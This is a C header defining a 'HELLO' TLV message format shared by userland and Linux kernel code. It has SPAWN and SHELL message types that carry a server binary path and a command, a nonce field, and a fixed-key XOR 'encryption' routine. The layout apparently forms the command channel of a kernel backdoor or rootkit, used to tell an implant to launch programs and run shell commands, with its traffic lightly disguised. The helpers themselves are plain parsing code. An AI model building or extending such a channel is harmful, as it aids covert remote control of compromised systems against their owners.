// hello_proto.h - shared HELLO TLV helpers for userland and kernel

#ifndef HELLO_PROTO_H
#define HELLO_PROTO_H

#ifdef __KERNEL__
#include <linux/types.h>
#include <linux/string.h>
#else
#include <stddef.h>
#include <string.h>
#include "intshort.h"
#endif

#define HELLO_VERSION 0x01
#define HELLO_T_SPAWN 0x01
#define HELLO_T_SHELL 0x02
#define HELLO_T_NONCE 0x03

typedef struct hello_view {
    const u8 *server_bin_path;
    size_t server_bin_path_len;
    const u8 *cmd;
    size_t cmd_len;
    u64 nonce;
    int server_started;
    int shell_started;
    int have_nonce;
} hello_view_t;

typedef struct hello_builder {
    const char *spawn_cmd;
    const char *shell_cmd;
    u64 nonce;
    int include_nonce;
} hello_builder_t;

static inline int hello_write_tlv(u8 *buf, size_t buf_len, size_t *offset, u8 type,
                                  const u8 *data, u16 data_len) {
    size_t need;
    if (!buf || !offset)
        return -1;
    need = (size_t)data_len + 3U;
    if (*offset > buf_len || buf_len - *offset < need)
        return -1;
    buf[*offset] = type;
    buf[*offset + 1] = (u8)(data_len >> 8);
    buf[*offset + 2] = (u8)(data_len & 0xff);
    if (data_len > 0 && data)
        memcpy(buf + *offset + 3, data, data_len);
    *offset += need;
    return 0;
}

static inline int hello_write_string_tlv(u8 *buf, size_t buf_len, size_t *offset,
                                         u8 type, const char *str) {
    const u8 *ptr = NULL;
    size_t len = 0;
    if (str) {
        len = strlen(str);
        if (len > 0xFFFFu)
            return -1;
        ptr = (const u8 *)str;
    }
    return hello_write_tlv(buf, buf_len, offset, type, ptr, (u16)len);
}

static inline int hello_build(u8 *buf, size_t buf_len, const hello_builder_t *builder) {
    size_t offset = 0;
    if (!buf || !builder || buf_len == 0)
        return -1;

    buf[offset++] = HELLO_VERSION;
    if (hello_write_string_tlv(buf, buf_len, &offset, HELLO_T_SPAWN,
                               builder->spawn_cmd ? builder->spawn_cmd : "") != 0)
        return -1;
    if (hello_write_string_tlv(buf, buf_len, &offset, HELLO_T_SHELL,
                               builder->shell_cmd ? builder->shell_cmd : "") != 0)
        return -1;
    if (builder->include_nonce) {
        u8 tmp[sizeof(u64)];
        u64 nonce = builder->nonce;
        int i;
        for (i = (int)sizeof(u64) - 1; i >= 0; i--) {
            tmp[i] = (u8)(nonce & 0xffU);
            nonce >>= 8;
        }
        if (hello_write_tlv(buf, buf_len, &offset, HELLO_T_NONCE, tmp, (u16)sizeof(tmp)) != 0)
            return -1;
    }
    return (int)offset;
}

static inline int hello_parse(const u8 *buf, size_t buf_len, hello_view_t *view) {
    size_t offset = 0;
    if (!buf || !view || buf_len == 0)
        return -1;
    memset(view, 0, sizeof(*view));

    if (buf[offset++] != HELLO_VERSION)
        return -1;

    while (offset + 3 <= buf_len) {
        u8 type = buf[offset++];
        u16 len_hi = buf[offset++];
        u16 len_lo = buf[offset++];
        u16 tlv_len = (len_hi << 8) | len_lo;
        if (offset + tlv_len > buf_len)
            return -1;
        switch (type) {
        case HELLO_T_SPAWN:
            view->server_bin_path = buf + offset;
            view->server_bin_path_len = tlv_len;
            view->server_started = 1;
            break;
        case HELLO_T_SHELL:
            view->cmd = buf + offset;
            view->cmd_len = tlv_len;
            view->shell_started = 1;
            break;
        case HELLO_T_NONCE:
            if (tlv_len != sizeof(u64))
                return -1;
            view->nonce = 0;
            for (u16 i = 0; i < tlv_len; i++)
                view->nonce = (view->nonce << 8) | buf[offset + i];
            view->have_nonce = 1;
            break;
        default:
            break;
        }
        offset += tlv_len;
    }

    if (offset != buf_len)
        return -1;

    return 0;
}

static const u8 hello_key_magic[4] = {4, 1, 2, 3};
static const u8 hello_zero_key[4] = {0, 0, 0, 0};
#define zero_key hello_zero_key

static inline void enc_dec(const u8 *input, u8 *output, const u8 *key, size_t len) {
    if (!input || !output || !key || len == 0) return;
    u8 tmp[4];
    size_t i = 0;
    while (i < len) {
        size_t chunk = len - i < 4 ? len - i : 4;
        size_t j;
        for (j = 0; j < chunk; j++) {
            tmp[j] = input[i + j] ^ key[j] ^ hello_key_magic[j];
        }
        for (j = 0; j < chunk; j++) {
            output[i + j] = tmp[j];
        }
        i += chunk;
    }
}

static inline u32 csum32(const u8 *p, size_t n) {
    u32 s = 0;
    size_t i;
    for (i = 0; i < n; i++)
        s += p[i];
    return s;
}


#endif /* HELLO_PROTO_H */
